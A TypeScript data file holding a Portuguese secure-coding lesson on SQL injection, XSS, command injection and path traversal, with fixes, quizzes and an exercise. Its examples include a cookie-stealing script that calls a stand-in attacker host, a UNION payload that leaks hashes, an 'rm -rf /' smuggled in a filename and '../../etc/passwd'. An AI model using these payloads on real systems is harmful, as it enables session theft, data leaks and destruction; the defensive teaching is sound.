import type { Modulo } from "../tipos";

export const SEG_MODULO_3: Modulo = {
  tipo: "modulo",
  slug: "entrada-hostil-e-injecao",
  titulo: "Entrada hostil e injeção: SQL, XSS, comandos e caminhos",
  resumo: "Por que dados de fora nunca são confiáveis, como funcionam as injeções mais comuns e as defesas certas para cada uma: parâmetros, codificação de saída, listas permitidas e caminhos canônicos.",
  nivel: "Júnior",
  leitura: "55 min",
  objetivos: [
    "Explicar o princípio comum das injeções: dados que são interpretados como código ou comando.",
    "Reproduzir e corrigir uma injeção de SQL usando consultas parametrizadas e lista de colunas permitidas.",
    "Diferenciar XSS refletido, armazenado e baseado em DOM e escolher a codificação de saída pelo contexto.",
    "Evitar a injeção de comandos do sistema operacional e o acesso indevido a arquivos (path traversal).",
    "Distinguir validação de entrada, codificação de saída e privilégios mínimos como camadas complementares.",
  ],
  preRequisitos: [
    "Ter feito os módulos anteriores da trilha, ou conhecer a ideia de defesa em profundidade.",
    "Conhecer o básico de SQL e de HTML.",
  ],
  pontosChave: [
    "Toda injeção nasce da mesma falha: misturar dados com código no mesmo texto e deixar o interpretador confundi-los.",
    "A defesa estrutural é separar os dois: consultas parametrizadas, APIs sem shell, codificação de saída.",
    "Validar a entrada ajuda, mas nunca substitui a defesa no ponto de uso.",
    "Nomes de tabelas, colunas e ordenações não podem ser parâmetros: use listas de valores permitidos.",
    "Quem recebe um caminho de arquivo precisa resolvê-lo e conferir se ele ainda está dentro da pasta permitida.",
  ],
  blocos: [
    { tipo: "p", texto: "Uma aplicação recebe dados o tempo todo: formulários, parâmetros de URL, cabeçalhos, arquivos, mensagens de outras APIs. Todos esses dados vêm de um mundo que você não controla, e qualquer um deles pode ter sido escrito por um atacante. A injeção acontece quando esses dados são colocados dentro de um texto que algum interpretador (o banco de dados, o navegador, o shell do sistema operacional) vai executar, e o interpretador não consegue distinguir o que era comando do programador do que era dado do atacante. É a categoria de falha mais antiga, e continua entre as mais frequentes porque o erro é fácil de cometer: basta concatenar uma string." },
    { tipo: "alerta", titulo: "Pratique só onde pode", texto: "Os exemplos usam bancos em memória e textos fictícios, e é assim que você deve treinar: em programas seus ou em ambientes de estudo, como os desafios da área Segurança do Koda. Nunca teste payloads de injeção em sistemas de terceiros sem autorização por escrito." },

    { tipo: "h", texto: "Injeção de SQL" },
    { tipo: "p", texto: "Imagine uma busca de usuário por login, escrita como uma string: \"SELECT login, perfil FROM usuarios WHERE login = '\" + entrada + \"'\". Para a entrada ana, tudo certo. Mas se o atacante digitar x' OR '1'='1, o texto final vira WHERE login = 'x' OR '1'='1', uma condição sempre verdadeira, e o banco devolve todos os usuários. As aspas digitadas pelo atacante fecharam a string do programador, e o que veio depois passou a ser SQL. Com a mesma técnica, ele pode usar UNION para misturar dados de outras tabelas na resposta, ler o esquema do banco, alterar ou apagar dados e, dependendo das permissões, até executar comandos no servidor." },
    { tipo: "codigo", linguagem: "python", legenda: "sqli.py", texto: `import sqlite3

banco = sqlite3.connect(":memory:")
banco.executescript("""
    CREATE TABLE usuarios (id INTEGER PRIMARY KEY, login TEXT, senha_hash TEXT, perfil TEXT);
    INSERT INTO usuarios (login, senha_hash, perfil) VALUES
        ('ana', 'hash-da-ana', 'cliente'),
        ('admin', 'hash-do-admin', 'administrador');
""")


def buscar_inseguro(login: str) -> list[tuple[str, str]]:
    consulta = f"SELECT login, perfil FROM usuarios WHERE login = '{login}'"
    return banco.execute(consulta).fetchall()


def buscar_seguro(login: str) -> list[tuple[str, str]]:
    return banco.execute("SELECT login, perfil FROM usuarios WHERE login = ?", (login,)).fetchall()


entrada_normal = "ana"
entrada_maliciosa = "x' OR '1'='1"

print("normal, inseguro :", buscar_inseguro(entrada_normal))
print("ataque, inseguro :", buscar_inseguro(entrada_maliciosa))
print("ataque, seguro   :", buscar_seguro(entrada_maliciosa))

extracao = "x' UNION SELECT login, senha_hash FROM usuarios --"
print("UNION, inseguro  :", buscar_inseguro(extracao))
print("UNION, seguro    :", buscar_seguro(extracao))

ordem_permitida = {"login", "perfil"}


def listar_ordenado(coluna: str) -> list[tuple[str, str]]:
    if coluna not in ordem_permitida:
        raise ValueError("coluna não permitida")
    return banco.execute(f"SELECT login, perfil FROM usuarios ORDER BY {coluna}").fetchall()


print("ordenação:", listar_ordenado("perfil"))
try:
    listar_ordenado("perfil; DROP TABLE usuarios")
except ValueError as erro:
    print("recusada:", erro)` },
    { tipo: "codigo", linguagem: "text", legenda: "Saída", texto: `normal, inseguro : [('ana', 'cliente')]
ataque, inseguro : [('ana', 'cliente'), ('admin', 'administrador')]
ataque, seguro   : []
UNION, inseguro  : [('admin', 'hash-do-admin'), ('ana', 'hash-da-ana')]
UNION, seguro    : []
ordenação: [('admin', 'administrador'), ('ana', 'cliente')]
recusada: coluna não permitida` },
    { tipo: "p", texto: "A versão insegura devolve todos os usuários com o OR e, pior, com o UNION entrega os hashes de senha de cada conta, que o atacante nem estava consultando. A versão segura passa o valor como parâmetro (o ponto de interrogação): o banco recebe o comando e o dado separadamente, e trata o dado sempre como dado, mesmo que ele contenha aspas ou palavras como OR e UNION. Por isso o mesmo ataque devolve uma lista vazia, pois não existe nenhum usuário cujo login seja literalmente \"x' OR '1'='1\". Esta é a defesa estrutural: não há como escapar o parâmetro, porque ele nunca é parte do texto SQL." },
    { tipo: "lista", itens: [
      "Use sempre consultas parametrizadas (ou o ORM, que as usa por baixo): PreparedStatement em Java, parâmetros nomeados em SQLAlchemy, placeholders $1 em bibliotecas de Node.",
      "Cuidado com os ORMs também: métodos que aceitam trechos de SQL em texto (como o raw, o text ou o @Query nativo com concatenação) reabrem a porta.",
      "Procedimentos armazenados não são vacina automática: se eles montam SQL por concatenação lá dentro, o problema continua.",
      "Dê ao usuário do banco da aplicação o mínimo de permissões: sem DROP, sem acesso a tabelas que ela não usa. Se a injeção acontecer, o estrago é limitado.",
      "Não exiba mensagens de erro do banco ao usuário: elas ajudam o atacante a montar o ataque.",
    ] },
    { tipo: "h3", texto: "O que não cabe em parâmetro: nomes e ordenações" },
    { tipo: "p", texto: "Parâmetros só substituem valores. Se o nome de uma coluna para ordenação vem do usuário (ORDER BY coluna), não existe parâmetro para isso, e a tentação é concatenar. A solução é uma lista de valores permitidos, como no final do exemplo: o código só aceita nomes que estão em um conjunto definido por você e recusa todo o resto. O mesmo vale para direção de ordenação (ASC ou DESC), nomes de tabelas e qualquer pedaço estrutural do comando." },

    { tipo: "h", texto: "XSS: injeção no navegador" },
    { tipo: "p", texto: "O cross-site scripting (XSS) é a injeção em que o interpretador é o navegador. Se a aplicação coloca texto vindo de um usuário em uma página HTML sem tratá-lo, e esse texto contém um <script>, o navegador do visitante executa o script como se fosse da aplicação, com acesso a tudo que ela pode acessar: cookies de sessão que não sejam HttpOnly, dados da página, ações em nome da pessoa. O ataque aparece em três formas." },
    { tipo: "tabela", legenda: "Os três tipos de XSS", cabecalho: ["Tipo", "Como acontece", "Exemplo"], linhas: [
      ["Refletido", "A entrada vem na requisição (URL ou formulário) e volta na resposta, e a vítima é levada a abrir um link montado pelo atacante.", "Uma página de busca que mostra \"Resultados para: ...\" sem escapar o termo."],
      ["Armazenado", "A entrada é guardada (comentário, perfil, nome) e mostrada depois a outras pessoas, sem exigir um link especial.", "Um comentário com script que roda em quem abrir o post. É o mais grave."],
      ["Baseado em DOM", "O script do próprio site lê dados da URL ou da página e os insere no DOM de forma insegura (innerHTML).", "Um trecho de JavaScript que faz elemento.innerHTML = location.hash."],
    ] },
    { tipo: "p", texto: "A defesa central é a codificação de saída: trocar os caracteres que têm significado especial no contexto onde o dado será colocado, para que o navegador os trate como texto. O contexto importa: o que é seguro no corpo do HTML (escapar <, > e &) não basta dentro de um atributo (também as aspas), em um JavaScript embutido ou em uma URL. A biblioteca padrão faz isso por você, como mostra o exemplo seguinte, que reúne também as duas próximas defesas." },
    { tipo: "codigo", linguagem: "python", legenda: "saidas.py", texto: `import html
import shlex
from pathlib import Path

comentario = '<script>fetch("https://atacante.example/?c=" + document.cookie)</script>'
print("sem escapar:", f"<p>{comentario}</p>")
print("escapado   :", f"<p>{html.escape(comentario)}</p>")
print("em atributo :", f'<input value="{html.escape(chr(34) + " onfocus=" + chr(34) + "alert(1)", quote=True)}">')

nome_do_arquivo = "relatorio.pdf; rm -rf /"
print("comando perigoso :", f"convert {nome_do_arquivo} saida.png")
print("com shlex.quote  :", f"convert {shlex.quote(nome_do_arquivo)} saida.png")
print("como lista (sem shell):", ["convert", nome_do_arquivo, "saida.png"])

BASE = Path("/srv/uploads").resolve()


def caminho_seguro(pedido: str) -> Path | None:
    candidato = (BASE / pedido).resolve()
    return candidato if candidato.is_relative_to(BASE) else None


for pedido in ["foto.png", "pasta/nota.txt", "../../etc/passwd", "/etc/passwd"]:
    resultado = caminho_seguro(pedido)
    print(f"{pedido:<20} ->", "recusado" if resultado is None else "permitido")` },
    { tipo: "codigo", linguagem: "text", legenda: "Saída", texto: `sem escapar: <p><script>fetch("https://atacante.example/?c=" + document.cookie)</script></p>
escapado   : <p>&lt;script&gt;fetch(&quot;https://atacante.example/?c=&quot; + document.cookie)&lt;/script&gt;</p>
em atributo : <input value="&quot; onfocus=&quot;alert(1)">
comando perigoso : convert relatorio.pdf; rm -rf / saida.png
com shlex.quote  : convert 'relatorio.pdf; rm -rf /' saida.png
como lista (sem shell): ['convert', 'relatorio.pdf; rm -rf /', 'saida.png']
foto.png             -> permitido
pasta/nota.txt       -> permitido
../../etc/passwd     -> recusado
/etc/passwd          -> recusado` },
    { tipo: "p", texto: "Nas duas primeiras linhas, o mesmo comentário, sem tratamento, viraria um script que envia o cookie do visitante a um servidor do atacante; escapado, vira texto visível, inofensivo. A terceira mostra o ataque a um atributo: sem escapar as aspas, o atacante fecharia o atributo value e adicionaria um evento (onfocus), e o quote=True do html.escape impede isso. Na prática, use frameworks que escapam por padrão (React, Angular, Vue, Thymeleaf e Jinja fazem isso), e desconfie dos pontos que desligam a proteção: dangerouslySetInnerHTML, v-html, innerHTML, |safe, th:utext. Se precisar mesmo exibir HTML enviado por usuários (um editor de texto rico), passe-o por um sanitizador reconhecido (como o DOMPurify) que remove o que é perigoso." },
    { tipo: "lista", itens: [
      "Cookies de sessão com HttpOnly: um XSS não consegue lê-los com JavaScript.",
      "Content Security Policy (CSP): um cabeçalho que restringe de onde scripts podem vir e proíbe scripts embutidos, o que reduz muito o estrago de um XSS que escape das outras defesas.",
      "Valide o formato do que for possível (um telefone tem dígitos), mas não confie nisso como defesa do XSS: nomes como \"O'Brien\" e textos livres precisam ser aceitos e, depois, codificados na saída.",
    ] },

    { tipo: "h", texto: "Injeção de comandos do sistema" },
    { tipo: "p", texto: "Quando a aplicação precisa chamar um programa externo (converter uma imagem, compactar um arquivo, rodar um script), é comum montar a linha de comando em texto e entregá-la ao shell. Se um pedaço dela vier do usuário, o shell interpreta os caracteres especiais: ; encadeia outro comando, | redireciona, $(...) executa um subcomando. No exemplo, o nome de arquivo \"relatorio.pdf; rm -rf /\" transforma uma conversão inocente em um comando que apaga o sistema. As defesas, da melhor à pior: primeiro, evitar o shell por completo, passando o programa e os argumentos como uma lista (subprocess.run([\"convert\", nome, \"saida.png\"]) em Python, ProcessBuilder em Java, execFile em Node), caso em que cada elemento é um argumento literal e nenhum caractere é interpretado. Segundo, validar o argumento contra uma lista de valores permitidos ou um formato estrito. Terceiro, só como último recurso, escapar com shlex.quote." },
    { tipo: "alerta", titulo: "Cuidado com os argumentos que parecem opções", texto: "Mesmo sem shell, um argumento que comece com um hífen (como -o ou --config) pode ser lido pelo programa como uma opção. Quando o argumento é um nome de arquivo vindo do usuário, use o separador -- (que encerra as opções), ou prefixe o caminho com ./, e valide o nome." },

    { tipo: "h", texto: "Acesso a arquivos: path traversal" },
    { tipo: "p", texto: "Se a aplicação serve arquivos de uma pasta a partir de um nome informado pelo usuário, um atacante tenta sair da pasta com sequências como ../../etc/passwd, ou com um caminho absoluto, ou com variações codificadas (%2e%2e%2f). Remover o texto \"../\" da entrada é uma defesa frágil, porque há muitas variações. A forma robusta é canonicalizar: juntar o caminho pedido à pasta base, resolvê-lo para o caminho absoluto final (resolvendo os \"..\" e os links simbólicos) e conferir se ele ainda está dentro da base. É o que a função caminho_seguro faz: os dois primeiros pedidos ficam dentro de /srv/uploads e são permitidos, e os dois últimos escapam dela e são recusados. Para uploads, gere o nome do arquivo no servidor (um identificador aleatório), em vez de usar o nome enviado, e valide o tipo e o tamanho." },

    { tipo: "h", texto: "Validar, codificar e limitar: três camadas diferentes" },
    { tipo: "p", texto: "É comum confundir as defesas, e cada uma tem um papel. Validar a entrada é aceitar só o que tem o formato esperado (um número entre 1 e 100, um e-mail, uma data), o mais cedo possível; reduz a superfície e barra muita coisa, mas não pode ser a única defesa, porque há textos legítimos que contêm caracteres especiais. Codificar a saída é tratar o dado conforme o destino onde ele será usado, o mais tarde possível, no ponto do uso (parâmetro de SQL, escape de HTML, argumento de processo). Limitar privilégios é garantir que, se mesmo assim algo falhar, o dano seja pequeno (usuário do banco restrito, processo sem permissão de escrita, contêiner sem acesso à rede). As três juntas formam a defesa em profundidade que você viu no primeiro módulo." },
    { tipo: "tabela", legenda: "A defesa certa para cada interpretador", cabecalho: ["Interpretador", "Ataque", "Defesa principal", "Camadas extras"], linhas: [
      ["Banco de dados", "Injeção de SQL", "Consultas parametrizadas; lista de valores permitidos para nomes.", "Usuário com mínimo de permissões; sem detalhes de erro ao usuário."],
      ["Navegador", "XSS", "Codificação de saída pelo contexto; frameworks que escapam por padrão.", "CSP, cookies HttpOnly, sanitizador para HTML permitido."],
      ["Shell do sistema", "Injeção de comandos", "Não usar o shell: lista de argumentos.", "Lista de valores permitidos; processo com poucas permissões."],
      ["Sistema de arquivos", "Path traversal", "Resolver o caminho e conferir se está dentro da base.", "Nomes gerados no servidor; permissões mínimas na pasta."],
    ] },
  ],
  questoes: [
    {
      enunciado: "Qual é a causa comum de todas as injeções?",
      opcoes: ["O uso de linguagens antigas", "A falta de internet", "Misturar dados do usuário com código ou comando no mesmo texto, deixando o interpretador confundi-los", "O uso de bancos relacionais"],
      correta: 2,
      explicacao: "Em SQL, HTML, shell e outros, o problema é o mesmo: o dado do atacante é tratado como parte do comando. A defesa estrutural é separar os dois.",
    },
    {
      enunciado: "Qual a defesa mais eficaz contra a injeção de SQL?",
      opcoes: ["Remover as aspas da entrada", "Consultas parametrizadas, que enviam comando e dados separadamente ao banco", "Converter a entrada para maiúsculas", "Esconder as mensagens de erro, apenas"],
      correta: 1,
      explicacao: "Com parâmetros, o banco trata o valor sempre como dado, mesmo que contenha aspas ou palavras como OR e UNION. Remover aspas é frágil e esconder erros só dificulta o diagnóstico do atacante.",
    },
    {
      enunciado: "O nome da coluna de ordenação vem do usuário (ORDER BY coluna). Como tratar com segurança?",
      opcoes: ["Passar como parâmetro (?)", "Concatenar depois de remover espaços", "Conferir se o valor está em uma lista de colunas permitidas, definida no código", "Aceitar qualquer valor que não tenha ponto e vírgula"],
      correta: 2,
      explicacao: "Parâmetros só substituem valores, e não partes estruturais do comando. Para nomes de colunas, tabelas e direção, a lista de valores permitidos é a defesa correta.",
    },
    {
      enunciado: "O que é um XSS armazenado?",
      opcoes: ["Uma entrada maliciosa que a aplicação guarda e depois mostra a outras pessoas, executando o script nos navegadores delas", "Um script guardado no navegador do atacante", "Um erro de disco", "Um script que só roda offline"],
      correta: 0,
      explicacao: "No XSS armazenado, o conteúdo (um comentário, um nome de perfil) fica gravado e é exibido a quem abrir a página, sem que a vítima precise clicar em um link especial. Por isso é o mais grave.",
    },
    {
      enunciado: "Como se defende o HTML contra XSS ao exibir um texto digitado por um usuário?",
      opcoes: ["Proibindo o usuário de digitar o símbolo <", "Colocando o texto em uma fonte menor", "Usando só letras maiúsculas", "Codificando a saída conforme o contexto (corpo, atributo, JavaScript, URL), de preferência com um framework que escapa por padrão"],
      correta: 3,
      explicacao: "A codificação de saída transforma os caracteres especiais em texto inofensivo no contexto de destino. Proibir caracteres atrapalha usuários legítimos e deixa brechas.",
    },
    {
      enunciado: "Para chamar um programa externo com um nome de arquivo vindo do usuário, qual a abordagem mais segura?",
      opcoes: ["Montar a linha de comando em texto e executar pelo shell", "Passar o programa e os argumentos como uma lista, sem o shell, validando o nome do arquivo", "Trocar o ponto e vírgula por espaço", "Executar como administrador"],
      correta: 1,
      explicacao: "Sem shell, cada elemento da lista é um argumento literal, e caracteres como ; | e $() perdem o significado. Validar o nome e executar com poucos privilégios completa a defesa.",
    },
    {
      enunciado: "Como impedir que o pedido \"../../etc/passwd\" leia um arquivo fora da pasta de uploads?",
      opcoes: ["Remover o texto \"../\" da entrada uma vez", "Converter para minúsculas", "Resolver o caminho final (canônico) e conferir se ele ainda está dentro da pasta base", "Limitar o tamanho do nome"],
      correta: 2,
      explicacao: "Remover \"../\" é contornável por variações. Resolver o caminho (com .. e links simbólicos) e checar se ele pertence à pasta base cobre todas as variações de uma vez.",
    },
  ],
  desafio: {
    titulo: "Corrigindo um mini-sistema vulnerável",
    enunciado: "Você recebe (escreva você mesmo, em um único arquivo, com sqlite3 em memória) uma mini-aplicação com quatro funções vulneráveis, cada uma com um tipo de injeção. Seu trabalho é demonstrar o ataque em cada uma, corrigi-la e escrever testes que provem que a correção funciona.",
    requisitos: [
      "Escreva buscar_usuario(login) com concatenação de SQL e demonstre, em um teste, um payload que devolve todos os usuários e outro com UNION que vaza a coluna de hashes.",
      "Escreva listar(coluna, direcao) com ORDER BY concatenado; corrija com lista de valores permitidos para a coluna e a direção.",
      "Escreva renderizar_comentario(texto) que monta HTML por concatenação; demonstre um payload com <script> e outro que escapa de um atributo, e corrija com html.escape(quote=True).",
      "Escreva converter(nome_do_arquivo) que monta um comando em texto (apenas monte e imprima, sem executar); mostre o que o shell veria com um nome malicioso e corrija com lista de argumentos mais validação do nome.",
      "Escreva abrir_upload(pedido) que lê arquivos de uma pasta base; corrija o path traversal resolvendo o caminho e conferindo se ele está dentro da base, e teste com ../, caminhos absolutos e variações.",
    ],
    criterios: [
      "Cada função tem uma versão vulnerável, um teste que explora a falha e uma versão corrigida com o mesmo teste falhando como esperado.",
      "A correção do SQL usa parâmetros, e não escape manual de aspas.",
      "A correção do caminho cobre pelo menos quatro variações do ataque.",
      "Nenhum teste executa um comando destrutivo de verdade: o ataque de comando é demonstrado apenas montando o texto.",
      "Você explica, para cada correção, qual das três camadas (validar, codificar, limitar) ela representa.",
    ],
    dica: "Escreva primeiro o teste que explora a falha e veja-o passar na versão vulnerável (o ataque funciona). Depois corrija e confirme que o mesmo teste, invertido, passa a mostrar que o ataque falhou.",
  },
  referencias: [
    { titulo: "OWASP: prevenção de injeção de SQL (em inglês)", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
    { titulo: "OWASP: prevenção de XSS (em inglês)", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" },
    { titulo: "OWASP: defesa contra injeção de comandos do SO (em inglês)", url: "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html" },
    { titulo: "MDN: Content Security Policy (CSP)", url: "https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Guides/CSP" },
  ],
};
